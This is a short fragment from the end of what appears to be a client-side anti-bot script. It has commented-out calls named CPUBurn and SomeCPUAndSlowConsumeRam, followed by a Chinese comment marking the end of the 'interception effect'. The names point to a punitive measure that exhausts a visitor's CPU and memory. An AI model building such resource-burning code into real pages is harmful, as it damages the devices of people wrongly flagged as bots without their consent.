                //                //                        EbooomDefense.CPUBurn(true);
                //                //                        EbooomDefense.ProgressiveExecution(EbooomDefense.SomeCPUAndSlowConsumeRam, 100000, 1000);
                //                //                    }, 1000);
                //                //                }
                //                //            });
                break;
            }
    }
};

//拦截效果 end ------------------------------------------------------------------------------------------------------------------------------------------------



